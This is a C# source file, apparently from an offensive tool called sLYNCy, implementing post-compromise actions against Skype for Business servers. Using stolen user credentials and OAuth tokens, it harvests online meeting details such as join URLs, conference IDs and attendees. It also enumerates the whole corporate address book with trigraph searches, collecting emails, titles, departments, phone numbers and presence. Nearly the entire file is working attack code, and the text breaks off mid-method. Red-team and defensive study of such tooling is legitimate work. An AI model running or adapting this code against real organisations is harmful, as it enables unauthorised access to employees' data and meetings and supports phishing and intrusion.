using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static sLYNCy_WPF.Enums;

namespace sLYNCy_WPF
{
    public class PostCompromise
    {
        public int killSwitch = 0;
        public string RealAddress = "";
        public static string applicationsURL = "";
        public MainWindow UI = null;
        public string peopleSearcher = "";
        public string myContactser = "";
        public string mySelfer = "";
        public string assignedMeetings = "";
        public string phoneDialIn = "";
        public string conversationHistory = "";
        public string conversations = "";
        public string communicationLink = "";
        public string selfLink = "";
        public string peopleSearch = "";
        public string myContactsLink = "";
        public string eventsLink = "";
        public static object additionalLinksLock = new object();
        public static Dictionary<string, List<string>> additionalLinks = new Dictionary<string, List<string>>();

        public void SnoopMeetings(IList<CredentialsRecord> selectedUsers, MainWindow UI, ObservableCollection<MeetingsObject> meetingsRecords, string baseURL)
        {

            Task t = Task.Run(() =>
            {
                List<CredentialsRecord> myList = new List<CredentialsRecord>();
                //PreEmpt for every record - so we've definitely got all access tokens
                int oneTimeHere = 0;
                UI.ThreadSafeAppendLog("[2]Beginning to gather compromised user(s) meetings...");
                foreach (CredentialsRecord record in selectedUsers)
                {
                    if (ValidateOptions(record))
                    {
                        if (PostCredsHelper.PreEmptOAuthPostExploit(record, UI.serviceInterfaces, UI, UI.enumeratedHostnames))
                        {

                            string accessToken = record.Token;
                            //Only re-get applications URL if we don't know it
                            if (applicationsURL == "")
                            {
                                GetApplicationsURL(accessToken);
                            }


                            UI.ThreadSafeAppendLog("[3]Applications URL: " + applicationsURL);
                            //Maybe always start both by authenticating to applications - can pull everything we need for both and make sure "freshly" auth'd - won't need to reauth mid-either - but do at start

                            //Would always have got this - so if not - not done - else, will have all
                            AuthenticateToApplications(accessToken, record, baseURL);
                            //After doing stage one - if the host was different and we had to jump - we've now changed the record's access token - so re-get access token from there before we continue
                            if (record.Token != accessToken)
                                accessToken = record.Token;
                            //So this means record either has access token - or has been able to get one added
                            //Now do first run for each record - creating an entry on the record and a List of meetings objects
                            List<MeetingsObject> preList = CheckForActiveMeeting(record, UI, ref oneTimeHere);
                            if (preList != null)
                            {
                                if (preList.Count > 0)
                                {
                                    foreach (MeetingsObject meet in preList)
                                    {
                                        AddMeetingsObject.Add(meet, meetingsRecords, UI);
                                    }
                                }
                            }
                            //NOT THREADED HERE FOR FIRST RUN - WILL THREAD ONCE WE'VE GOT THEM ALL?
                            //So for this record - do the full run through and add new meetings objects to the list for each one (might only be one)


                        }
                    }

                }
                UI.saveValidMeetings(null, SaveType.autoLog);
                UI.unlockUI();
            });

        }

        public async void PullAddressBook(bool checkContacts, bool checkFullAddressList, bool chooseEmailAddress, bool chooseDepartment, bool choosePhoneNumber, bool chooseTitle, bool chooseNote, bool chooseOffice, bool choosePresence, bool allChars, bool commonChars, CredentialsRecord record, ObservableCollection<DataRecord> dataList, string baseUrl)
        {
            killSwitch = 0;

            List<string> personalContacts = new List<string>();
            List<String> namesChecked = new List<string>();


            if (ValidateOptions(record))
            {
                await Task.Run(() =>
                {
                    if (PostCredsHelper.PreEmptOAuthPostExploit(record, UI.serviceInterfaces, UI, UI.enumeratedHostnames))
                    {
                        try
                        {
                            if (killSwitch == 1)
                            {
                                killSwitch = 0;
                                //Finally say done!
                                UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                UI.unlockUI();
                                return;
                            }

                            UI.ThreadSafeAppendLog("[1][*]Beginning pulling address book...");
                            string accessToken = record.Token;

                            //Only re-get applications URL if we don't know it
                            if (applicationsURL == "")
                            {
                                GetApplicationsURL(accessToken);
                            }

                            UI.ThreadSafeAppendLog("[3]Applications URL: " + applicationsURL);

                            //Maybe always start both by authenticating to applications - can pull everything we need for both and make sure "freshly" auth'd - won't need to reauth mid-either - but do at start
                            if (killSwitch == 1)
                            {
                                killSwitch = 0;
                                //Finally say done!
                                UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                UI.unlockUI();
                                return;
                            }
                            //Would always have got this - so if not - not done - else, will have all
                            AuthenticateToApplications(accessToken, record, baseUrl);
                            //After doing stage one - if the host was different and we had to jump - we've now changed the record's access token - so re-get access token from there before we continue
                            if (record.Token != accessToken)
                                accessToken = record.Token;

                            //Always get self now and add to selfRecords
                            if (killSwitch == 1)
                            {
                                killSwitch = 0;
                                //Finally say done!
                                UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                UI.unlockUI();
                                return;
                            }
                            UI.ThreadSafeAppendLog("[2]Pulling chosen compromised user details...");
                            //MakeGALRequest takes links - adds if unique, then returns (so old + new) - then at end will just send all to additional threads...
                            additionalLinks = new Dictionary<string, List<string>>();

                            additionalLinks = MakeGALRequest(mySelfer, accessToken, additionalLinks, true, checkFullAddressList, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, GALRequest.Self, personalContacts);

                            if (checkContacts)
                            {
                                if (killSwitch == 1)
                                {
                                    killSwitch = 0;
                                    //Finally say done!
                                    UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                    UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                    UI.unlockUI();
                                    return;
                                }
                                UI.ThreadSafeAppendLog("[2]Pulling chosen compromised user personal contacts...");
                                additionalLinks = MakeGALRequest(myContactser, accessToken, additionalLinks, false, checkFullAddressList, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, GALRequest.PersonalContacts, personalContacts);
                            }

                            if (checkFullAddressList)
                            {

                                UI.ThreadSafeAppendLog("[2]Pulling all SIP enabled users from the company address list...");
                                string whichResource = "";
                                if (commonChars)
                                {
                                    whichResource = "sLYNCy_WPF.PostCompromise.Lists.CommonTrigraphs.txt";
                                }
                                else if (allChars)
                                {
                                    whichResource = "sLYNCy_WPF.PostCompromise.Lists.AllTrigraphs.txt";
                                }
                                List<string> relevantLines = LoadList(whichResource);
                                List<Task> checkFullTasks = new List<Task>();
                                foreach (String line in relevantLines)
                                {
                                    if (killSwitch == 1)
                                    {
                                        killSwitch = 0;
                                        //Finally say done!
                                        UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                        UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                        UI.unlockUI();
                                        return;
                                    }
                                    checkFullTasks.Add(MakeGALRequestAsync(peopleSearcher + "?query=" + line + "&limit=100", accessToken, additionalLinks, false, checkFullAddressList, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, GALRequest.PeopleSearch, personalContacts));
                                }

                            }

                            //Handle additional threads for additional links if necessary
                            if (additionalLinks.Count > 0)
                            {
                                UI.ThreadSafeAppendLog("[1][*] Finished Main Address Book task, however, threads are still pulling Presence and Note data...");

                                int totalAdditional = 0;
                                foreach (KeyValuePair<string, List<string>> dic in additionalLinks)
                                {
                                    foreach (string link in dic.Value)
                                    {
                                        totalAdditional++;
                                    }

                                }

                                UI.ThreadSafeAppendLog("[3]Number of additional links to check: " + totalAdditional);
                                UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                MakeAdditionalRequests(additionalLinks, accessToken, chooseNote, choosePresence, choosePhoneNumber, chooseOffice, dataList);
                            }
                            else
                            {
                                //Finally say done!
                                UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
                                UI.saveAddressBook(null, Enums.SaveType.autoLog);
                                UI.unlockUI();

                            }
                        }
                        catch (Exception e)
                        {

                        }
                    }
                });
            }

        }


        public void Stop(MainWindow UI)
        {
            killSwitch = 1;
            UI.ThreadSafeAppendLog("[1]Stop sent to threads - it may take a while for in progress requests to finish...");
            UI.ThreadSafeAppendLog("[1]You will be notified when AddressBook pulling activities have finished...");
        }


        private List<MeetingsObject> CheckForActiveMeeting(CredentialsRecord record, MainWindow UI, ref int oneTimeHere)
        {


            List<MeetingsObject> myList = new List<MeetingsObject>();
            try
            {

                if (conversationHistory != "Disabled")
                    UI.ThreadSafeAppendLog("[1]User: " + record.Username + " - Conversation History: " + conversationHistory);

                //If first time - get phone dial in info:
                if (oneTimeHere == 0)
                {
                    HttpWebRequest requestDialInInfo = (HttpWebRequest)WebRequest.Create(phoneDialIn);
                    requestDialInInfo.Method = "GET";
                    //request.ContentType = "application/json";
                    requestDialInInfo.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1";
                    requestDialInInfo.Accept = "application/json";
                    requestDialInInfo.Headers.Add("Authorization: Bearer " + record.Token);
                    HttpWebResponse responseDialIn = (HttpWebResponse)requestDialInInfo.GetResponse();
                    // Get the stream associated with the response.
                    Stream receiveStreamDialIn = responseDialIn.GetResponseStream();
                    StreamReader readStreamDialIn = new StreamReader(receiveStreamDialIn, Encoding.UTF8);
                    string responseDialInString = readStreamDialIn.ReadToEnd();


                    responseDialIn.Close();
                    readStreamDialIn.Close();
                    try
                    {
                        JObject DialInObject = JObject.Parse(responseDialInString);
                        string internalURL = (string)DialInObject.SelectToken("internalDirectoryUri");
                        string externalURL = (string)DialInObject.SelectToken("externalDirectoryUri");
                        UI.ThreadSafeAppendLog("[1]Internal Directory Base URI: " + internalURL);
                        UI.ThreadSafeAppendLog("[1]External Directory Base URI: " + externalURL);
                        JToken forDialIns = DialInObject.SelectToken("_embedded.dialInRegion");
                        IEnumerable<JToken> getDialInsTokens = forDialIns.Children();

                        foreach (JToken dialIns in getDialInsTokens)
                        {
                            string dialInNumber = (string)dialIns.SelectToken("number");
                            UI.ThreadSafeAppendLog("[1]" + dialInNumber);
                        }
                    }
                    catch (Exception pp)
                    {

                    }

                    oneTimeHere = 1;
                }

                //GET assigned meetings
                HttpWebRequest requestMeetings = (HttpWebRequest)WebRequest.Create(assignedMeetings);
                requestMeetings.Method = "GET";
                requestMeetings.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1";
                requestMeetings.Accept = "application/json";
                requestMeetings.Headers.Add("Authorization: Bearer " + record.Token);
                HttpWebResponse responseMeetings = (HttpWebResponse)requestMeetings.GetResponse();
                // Get the stream associated with the response.
                Stream receiveStreamMeetings = responseMeetings.GetResponseStream();
                StreamReader readStreamMeetings = new StreamReader(receiveStreamMeetings, Encoding.UTF8);
                string responseMeetingsString = readStreamMeetings.ReadToEnd();


                responseMeetings.Close();
                readStreamMeetings.Close();

                JObject MeetingsObject = JObject.Parse(responseMeetingsString);
                JToken forMeetings = MeetingsObject.SelectToken("_embedded.myOnlineMeeting");
                if (forMeetings == null)
                    forMeetings = MeetingsObject.SelectToken("_embedded.myAssignedOnlineMeeting");

                if (forMeetings != null)
                {
                    IEnumerable<JToken> getMeetingsTokens = forMeetings.Children();

                    foreach (JToken meetingsT in getMeetingsTokens)
                    {
                        string subjectTemp = (string)meetingsT.SelectToken("subject");

                        //Get subject - but strip commas so not screw up csv
                        string subject = "";
                        if (subjectTemp != null)
                            subject = subjectTemp.Replace(",", "");

                        string link = (string)meetingsT.SelectToken("_links.self.href");

                        MeetingsObject meeting = new MeetingsObject();
                        if (subject != null && subject != "")
                        {
                            meeting.Subject = subject;
                        }
                        else
                        {

                        }
                        if (link != null)
                        {
                            if (subject == null)
                            {

                                meeting.Subject = "";
                            }
                            meeting.Link = link;

                        }

                        if (meeting.Link != null)
                        {
                            //GET link - relative to base - with our creds
                            //GET assigned meetings
                            string newLink = "https://" + RealAddress + meeting.Link;
                            HttpWebRequest requestNewMeetings = (HttpWebRequest)WebRequest.Create(newLink);
                            requestNewMeetings.Method = "GET";

                            requestNewMeetings.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1";
                            requestNewMeetings.Accept = "application/json";
                            requestNewMeetings.Headers.Add("Authorization: Bearer " + record.Token);
                            HttpWebResponse responseNewMeetings = (HttpWebResponse)requestNewMeetings.GetResponse();

                            Stream receiveStreamNewMeetings = responseNewMeetings.GetResponseStream();
                            StreamReader readStreamNewMeetings = new StreamReader(receiveStreamNewMeetings, Encoding.UTF8);
                            string responseNewMeetingsString = readStreamNewMeetings.ReadToEnd();
                            responseNewMeetings.Close();
                            readStreamNewMeetings.Close();
                            //That is 1 single object
                            JObject NewMeetingsObject = JObject.Parse(responseNewMeetingsString);
                            string confID = (string)NewMeetingsObject.SelectToken("conferenceId");
                            string joinURL = (string)NewMeetingsObject.SelectToken("joinUrl");
                            string expirationTime = (string)NewMeetingsObject.SelectToken("expirationTime");
                            string lobbyBypassForPhoneUsers = (string)NewMeetingsObject.SelectToken("lobbyBypassForPhoneUsers");
                            if (lobbyBypassForPhoneUsers != null)
                            {

                                meeting.LobbyBypass = lobbyBypassForPhoneUsers;
                            }
                            if (confID != null)
                            {

                                meeting.ConfID = confID;
                            }
                            if (joinURL != null)
                            {

                                meeting.JoinURL = joinURL;
                            }
                            if (expirationTime != null)
                            {

                                try
                                {
                                    var cultureInfo = new CultureInfo("en-US");
                                    DateTime myTime = DateTime.ParseExact(expirationTime, "MM/dd/yyyy HH:mm:ss", cultureInfo);
                                    DateTime realTime = myTime.AddDays(-14);
                                    meeting.ExpirationTime = realTime.ToLongDateString() + " " + realTime.ToLongTimeString();
                                }
                                catch (Exception sdf)
                                {

                                }
                            }

                            //Pull out .attendees and .conferenceId
                            IEnumerable<JToken> tokensA = NewMeetingsObject.SelectTokens("attendees");
                            StringBuilder atds = new StringBuilder();
                            List<string> atts = new List<string>();
                            foreach (JToken tokenAT in tokensA)
                            {
                                string att = tokenAT.ToString();
                                if (att != null)
                                {
                                    string att1 = att.Replace("[", "");
                                    string att2 = att1.Replace("]", "");
                                    string att3 = att2.Replace("\"", "");
                                    string att4 = att3.Replace(" ", "");
                                    string att5 = att4.Replace("\r\n", "");
                                    string att6 = att5.Replace("sip:", "");

                                    if (att6 == "" || att6 == null)
                                    {

                                    }
                                    else
                                    {
                                        atts.Add(att6);
                                    }
                                }
                            }
                            if (atts.Count == 0)
                                atds.Append("");
                            else if (atts.Count == 1)
                                atds.Append(atts.First());
                            else if (atts.Count > 1)
                            {
                                string lastAtts = atts.Last();
                                foreach (string attends in atts)
                                {
                                    if (attends == lastAtts)
                                        atds.Append(attends);
                                    else
                                        //Space between as csv output
                                        atds.Append(attends + " ");
                                }
                            }
                            string testATS = atds.ToString();

                            meeting.Attendees = testATS;
                        }
                        meeting.UserRecord = record;
                        myList.Add(meeting);
                    }

                }


                return myList;

            }
            catch (WebException webException3)
            {
                HttpWebResponse response = webException3.Response as HttpWebResponse;
                try
                {

                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    WebHeaderCollection headers = response.Headers;
                    UI.ThreadSafeAppendLog("[1]Exception: " + responseString);
                    return null;
                }
                catch (Exception eter)
                {
                    UI.ThreadSafeAppendLog("[1]Exception: " + eter.ToString());
                    return null;
                }
            }
            catch (Exception ep)
            {
                UI.ThreadSafeAppendLog("[1]Exception: " + ep.ToString());
                return null;
            }

        }


        public void SetAdditionalLinks(Dictionary<string, List<string>> tempAdditionalLinks)
        {
            lock (additionalLinksLock)
            {
                additionalLinks = tempAdditionalLinks;
            }
        }


        public bool ValidateOptions(CredentialsRecord record)
        {
            if (record.Username == "" || record.Password == "" || record.Username == null || record.Password == null)
            {
                if (record.AccountDisabled == "Y")
                {
                    UI.ThreadSafeAppendLog("[1]The selected account is disabled and cannot be used.");
                    return false;
                }
                else
                {
                    UI.ThreadSafeAppendLog("[1]Please choose a user for which you have already discovered the password...");
                    return false;
                }
            }
            else if (record.PasswordExpired == "Y")
            {
                UI.ThreadSafeAppendLog("[1]The selected account's password has expired and cannot be used by Slyncy for Post Creds/Exploitation. The password may have been re-used elsewhere?");
                return false;
            }
            else if (record.ServerError == "Y")
            {
                UI.ThreadSafeAppendLog("[1]The selected credentials are correct, however, the server returned an error when attempting to authenticate and may be in a broken state. The password may work elsewhere?");
                return false;
            }
            else if (record.SipEnabled == "N")
            {
                UI.ThreadSafeAppendLog("[1]The selected credentials are correct, however, the user has not been enabled for Skype for Business. This password should work anywhere else - outlook maybe?");
                return false;
            }
            if (RealAddress == "")
            {
                UI.ThreadSafeAppendLog("[1]Unable to determine real Skype server address...");
                return false;
            }
            return true;
        }

        public void GetApplicationsURL(string accessToken)
        {
            //Make a GET request with access token
            WebRequests getApplicationsURL = PostCredsHelper.CreateWebRequest("https://" + RealAddress + "/autodiscover/autodiscoverservice.svc/root/oauth/user", UI, Enums.HttpMethodChoice.GET, accessToken);
            UI.ThreadSafeAppendLog("[3]Discovering application root: " + getApplicationsURL.request.RequestUri);
            HttpWebResponse applicationsURLResponse = getApplicationsURL.MakeGETRequest();
            string responseAutodiscover = WebRequests.GetResponseString(applicationsURLResponse);
            UI.ThreadSafeAppendLog("[3]Response: " + responseAutodiscover);
            Match match = RegexClass.ReturnMatch(Enums.Regexs.applicationsURL, responseAutodiscover);
            applicationsURL = match.Value.Substring(0, match.Value.Length - 1);
        }

        public void AuthenticateToApplications(string accessToken, CredentialsRecord record, string baseURL)
        {
            try
            {

                WebRequests requestApplications = PostCredsHelper.CreateWebRequest(applicationsURL, UI, Enums.HttpMethodChoice.POST, accessToken);
                //Check if applications host is different to "RealAddress" and reauthenticate if so
                if (requestApplications.request.Host != baseURL)
                {
                    //Weird case where after authenticating to /root/oauth/user it turns out the applications host is different - we need to authenticate to this new host before carrying on
                    UI.ThreadSafeAppendLog("[1]Applications host is different to autodiscover host we need to authenticate to the real applications host...");
                    //Set real address to the one given in the reply for further requests
                    //Should I also update the hostname record - from nevtek-wap to nevtek-skypereal? Or add this new one?
                    //Though that is still real and I found it...
                    RealAddress = requestApplications.request.Host;
                    UI.ThreadSafeAppendLog("[1]Real host: " + RealAddress);
                    //Now need to authenticate to this new host:
                    if (AuthenticateDifferentApplicationsHost(record, requestApplications.request.Host))
                    {
                        UI.ThreadSafeAppendLog("[1]Authenticated to new host...");
                        //Set access token to record token (should have been updated)
                        accessToken = record.Token;
                        requestApplications = PostCredsHelper.CreateWebRequest(applicationsURL, UI, Enums.HttpMethodChoice.POST, accessToken);
                        UI.ThreadSafeAppendLog("[1]Access token updated...");
                    }

                }


                requestApplications.postData = @"{UserAgent: ""your user agent"", Culture: ""en-US"", EndpointId: ""random_guid""}";

                UI.ThreadSafeAppendLog("[3] Making POST request with access token to: " + applicationsURL);

                HttpWebResponse requestApplicationsResponse = requestApplications.MakePOSTRequest();
                string responseString = WebRequests.GetResponseString(requestApplicationsResponse);
                UI.ThreadSafeAppendLog("[3]Applications Response: " + responseString);

                JObject test = JObject.Parse(responseString);

                assignedMeetings = "https://" + RealAddress + (string)test.SelectToken("_embedded.onlineMeetings._links.myOnlineMeetings.href");
                phoneDialIn = "https://" + RealAddress + (string)test.SelectToken("_embedded.onlineMeetings._links.phoneDialInInformation.href");
                conversationHistory = (string)test.SelectToken("_embedded.communication.conversationHistory");
                conversations = "https://" + RealAddress + (string)test.SelectToken("_embedded.communication._links.conversations.href");

                JToken forOperator2 = test.SelectToken("_embedded.communication");
                IEnumerable<JToken> getOperatorIDTokens = forOperator2.Children();
                JToken startMessagingLink = "https://" + RealAddress + test.SelectToken("_embedded.communication._links.startMessaging.href");
                eventsLink = "https://" + RealAddress + (string)test.SelectToken("_links.events.href");
                communicationLink = "https://" + RealAddress + (string)test.SelectToken("_embedded.communication._links.self.href");
                string etagForSelf = (string)test.SelectToken("_embedded.communication.etag");
                string operatorID = "";
                int numberToken = 0;
                foreach (JToken operators in getOperatorIDTokens)
                {
                    if (numberToken == 1)
                    {
                        string tempp = operators.ToString();
                        string temp = tempp.Replace("\": \"please pass this in a PUT request\"", "");
                        operatorID = temp.Replace("\"", "");

                    }
                    numberToken++;
                }

                selfLink = (string)test.SelectToken("_embedded.me._links.self.href");
                myContactsLink = (string)test.SelectToken("_embedded.people._links.myContacts.href");
                peopleSearch = (string)test.SelectToken("_embedded.people._links.search.href");
                peopleSearcher = "https://" + RealAddress + peopleSearch;
                myContactser = "https://" + RealAddress + myContactsLink;
                mySelfer = "https://" + RealAddress + selfLink;
            }
            catch (Exception e)
            {

            }
        }

        public Dictionary<string, List<string>> MakeGALRequest(string url, string accessToken, Dictionary<string, List<string>> additionalLinks, bool isSelf, bool checkFullAddressList, bool chooseNote, bool choosePresence, bool choosePhoneNumber, bool chooseEmailAddress, bool chooseTitle, bool chooseDepartment, bool chooseOffice, ObservableCollection<DataRecord> dataList, GALRequest requestType, List<string> personalContacts)
        {
            WebRequests myGALRequest = PostCredsHelper.CreateWebRequest(url, UI, Enums.HttpMethodChoice.GET, accessToken);

            UI.ThreadSafeAppendLog("[3]Making GET request to: " + url);

            HttpWebResponse GALResponse = myGALRequest.MakeGETRequest();
            string responseStringGAL = WebRequests.GetResponseString(GALResponse);
            UI.ThreadSafeAppendLog("[3]Response: " + responseStringGAL);
            JObject rootObject = JObject.Parse(responseStringGAL);


            switch (requestType)
            {
                case Enums.GALRequest.Self:
                    JToken rootToken = rootObject.Root;
                    additionalLinks = ParseJSON(rootToken, additionalLinks, checkFullAddressList, true, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.Self, accessToken);
                    break;
                case Enums.GALRequest.PersonalContacts:
                    JToken embeddedToken = rootObject.SelectToken("_embedded.contact");
                    IEnumerable<JToken> contacts = embeddedToken.Children();
                    foreach (JToken conts in contacts)
                    {
                        additionalLinks = ParseJSON(conts, additionalLinks, checkFullAddressList, false, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.PersonalContacts, accessToken);
                    }
                    break;
                case Enums.GALRequest.PeopleSearch:
                    JToken embeddedTokenP = rootObject.SelectToken("_embedded.contact");
                    string moreResults = (string)embeddedTokenP.SelectToken("moreResultsAvailable");
                    IEnumerable<JToken> contactsP = embeddedTokenP.Children();
                    foreach (JToken contsP in contactsP)
                    {
                        additionalLinks = ParseJSON(contsP, additionalLinks, checkFullAddressList, false, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.PeopleSearch, accessToken);
                    }
                    break;
            }


            return additionalLinks;
        }

        public Task MakeGALRequestAsync(string url, string accessToken, Dictionary<string, List<string>> additionalLinks, bool isSelf, bool checkFullAddressList, bool chooseNote, bool choosePresence, bool choosePhoneNumber, bool chooseEmailAddress, bool chooseTitle, bool chooseDepartment, bool chooseOffice, ObservableCollection<DataRecord> dataList, GALRequest requestType, List<string> personalContacts)
        {
            WebRequests myGALRequestAsync = PostCredsHelper.CreateWebRequest(url, UI, Enums.HttpMethodChoice.GET, accessToken);

            UI.ThreadSafeAppendLog("[3]Making GET request to: " + url);

            HttpWebResponse GALResponse = myGALRequestAsync.MakeGETRequest();
            string responseStringGAL = WebRequests.GetResponseString(GALResponse);
            UI.ThreadSafeAppendLog("[3]Response: " + responseStringGAL);
            JObject rootObject = JObject.Parse(responseStringGAL);


            switch (requestType)
            {
                case Enums.GALRequest.Self:
                    JToken rootToken = rootObject.Root;
                    additionalLinks = ParseJSON(rootToken, additionalLinks, checkFullAddressList, true, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.Self, accessToken);
                    break;
                case Enums.GALRequest.PersonalContacts:
                    JToken embeddedToken = rootObject.SelectToken("_embedded.contact");
                    IEnumerable<JToken> contacts = embeddedToken.Children();
                    foreach (JToken conts in contacts)
                    {
                        additionalLinks = ParseJSON(conts, additionalLinks, checkFullAddressList, false, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.PersonalContacts, accessToken);
                    }
                    break;
                case Enums.GALRequest.PeopleSearch:
                    JToken embeddedTokenP = rootObject.SelectToken("_embedded.contact");
                    string moreResults = (string)embeddedTokenP.SelectToken("moreResultsAvailable");
                    IEnumerable<JToken> contactsP = embeddedTokenP.Children();
                    foreach (JToken contsP in contactsP)
                    {
                        additionalLinks = ParseJSON(contsP, additionalLinks, checkFullAddressList, false, chooseNote, choosePresence, choosePhoneNumber, chooseEmailAddress, chooseTitle, chooseDepartment, chooseOffice, dataList, personalContacts, Enums.GALRequest.PeopleSearch, accessToken);
                    }
                    break;
            }
            SetAdditionalLinks(additionalLinks);
            return Task.CompletedTask;
        }

        public Dictionary<string, List<string>> AddLink(string name, string link, Dictionary<string, List<string>> additionalLinks)
        {
            if (additionalLinks.ContainsKey(name))
            {
                List<string> appendLink = new List<string>();
                additionalLinks.TryGetValue(name, out appendLink);
                if (appendLink.Contains(link))
                {

                }
                else
                {
                    appendLink.Add(link);
                    additionalLinks[name] = appendLink;
                }
            }
            else
            {
                //No links for this name at all - fine - create list of links and add this one with the name as key to dic
                List<string> links = new List<string>();
                links.Add(link);
                additionalLinks.Add(name, links);
            }
            return additionalLinks;
        }

        public Dictionary<string, List<string>> ParseJSON(JToken rootToken, Dictionary<string, List<string>> additionalLinks, bool checkFullAddressList, bool isSelf, bool chooseNote, bool choosePresence, bool choosePhoneNumber, bool chooseEmailAddress, bool chooseTitle, bool chooseDepartment, bool chooseOffice, ObservableCollection<DataRecord> dataList, List<string> personalContacts, GALRequest requestType, string accessToken)
        {
            string SipUsername = "";
            string emailAddress = "";
            string name = "";
            string title = "";
            string department = "";
            string phoneNumber = "";
            string note = "";
            string presence = "";
            string office = "";

            name = (string)rootToken.SelectToken("name");
            if (requestType == GALRequest.PersonalContacts)
                personalContacts.Add(name);


            //If we are not pulling from the full address list - so full address list will fill everything in for all - so if choosing personal contacts - still
            //Only Full address list would stop needing to do this
            if (checkFullAddressList != true)
            {
                if (isSelf)
                {
                    //So we are looking at ourself (and maybe contacts) but not doing full address list - so need to construct extra links for "ourself" from what we've got (if necessary)
                    string tempMe = (string)rootToken.SelectToken("_links.photo.href");
                    string baseMe = "https://" + RealAddress + tempMe.Replace("photos", "people");
                    string noteMe = baseMe + "/note";
                    string presenceMe = baseMe + "/presence";


                    if (chooseNote)
                    {
                        additionalLinks = AddLink(name, noteMe, additionalLinks);
                    }
                    if (choosePresence)
                    {
                        additionalLinks = AddLink(name, presenceMe, additionalLinks);
                    }
                    if (choosePhoneNumber)
                    {
                        additionalLinks = AddLink(name, baseMe, additionalLinks);
                    }
                }
            }

            //ALWAYS PULL SIP USERNAME
            string tempUsername = (string)rootToken.SelectToken("uri");
            //Definitely some unecessary in here - as this is stolen from https:// up to /
            Match matchSIP = RegexClass.ReturnMatch(Regexs.sipUsername, tempUsername);
            if (matchSIP.Success)
            {
                SipUsername = matchSIP.Value;
            }


            if (chooseEmailAddress)
            {
                List<string> emailAddressesR = new List<string>();
                IEnumerable<JToken> tokensR = rootToken.SelectTokens("emailAddresses");
                StringBuilder emailAddresses = new StringBuilder();
                foreach (JToken tokent in tokensR)
                {
                    string eAddress = tokent.ToString();
                    if (eAddress != null)
                    {
                        string eAddress1 = eAddress.Replace("[", "");
                        string eAddress2 = eAddress1.Replace("]", "");
                        string eAddress3T = eAddress2.Replace("\"", "");
                        string eAddress3TT = eAddress3T.Replace(" ", "");
                        string eAddress3 = eAddress3TT.Replace("\r\n", "");
                        if (eAddress3 == "" || eAddress3 == null)
                        {

                        }
                        else
                        {
                            emailAddressesR.Add(eAddress3);
                        }
                    }

                }

                //This should create a string of format address1, address2
                if (emailAddressesR.Count == 1)
                {
                    emailAddress = emailAddressesR.First();
                }
                else if (emailAddressesR.Count == 0)
                {
                    emailAddress = "";
                }
                else if (emailAddressesR.Count > 1)
                {
                    string last = emailAddressesR.Last();
                    foreach (string address in emailAddressesR)
                    {
                        if (address == last)
                        {
                            emailAddresses.Append(address);
                        }
                        else
                        {
                            emailAddresses.Append(address + ", ");
                        }
                    }
                    string emailAddressTT = emailAddresses.ToString();
                    emailAddress = emailAddressTT.Trim();
                }

            }

            if (chooseTitle)
            {
                title = (string)rootToken.SelectToken("title");
            }

            if (chooseDepartment)
            {
                switch (requestType)
                {
                    case GALRequest.Self:
                        department = (string)rootToken.SelectToken("department");
                        break;
                    case GALRequest.PersonalContacts:
                        if (checkFullAddressList)
                        {

                        }
                        else
                        {
                            //Actually need to make a people search on this name to get department if personal contacts
                            WebRequests ContactsGALRequest = PostCredsHelper.CreateWebRequest(peopleSearcher + "?query=" + name + "&limit=100", UI, Enums.HttpMethodChoice.GET, accessToken);
                            UI.ThreadSafeAppendLog("[3]Making additional GET request to: " + peopleSearcher + "?query=" + name + "&limit=100");
                            HttpWebResponse ContactsGALResponse = ContactsGALRequest.MakeGETRequest();
                            string responseStringGAL = WebRequests.GetResponseString(ContactsGALResponse);
                            JObject DeptContsObject = JObject.Parse(responseStringGAL);
                            JToken contactsTokenDept = DeptContsObject.SelectToken("_embedded.contact");
                            IEnumerable<JToken> contactsDeptConts = contactsTokenDept.Children();
                            foreach (JToken contsContDept in contactsDeptConts)
                            {
                                //Get Broader contacts token
                                department = (string)contsContDept.SelectToken("department");
                            }
                        }
                        break;
                    case GALRequest.PeopleSearch:
                        department = (string)rootToken.SelectToken("department");
